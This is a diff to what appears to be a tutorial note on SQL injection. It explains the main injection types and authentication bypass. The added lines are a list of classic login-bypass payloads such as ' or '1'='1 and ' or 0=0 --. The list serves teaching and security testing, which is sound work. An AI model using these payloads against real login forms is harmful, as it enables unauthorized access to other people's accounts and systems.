@@ -6,3 +6,21 @@ SQL Injection is a cyber attack where hackers insert malicious SQL code into inp
 3.Inferential or Blind
 # Authentication Bypass(Subverting Query Logic)
 In short,SQL injection vulnerability allowing login bypass.To authenticate login panel some true conditions have been used.
+Some payloads:
+' or '1'='1
+
+' or 0=0 --
+
+" or 0=0 --
+
+' or 0=0 #
+
+" or 0=0 #
+
+'="or'
+
+hi" or 1=1 --
+
+hi' or 1=1 --
+
+
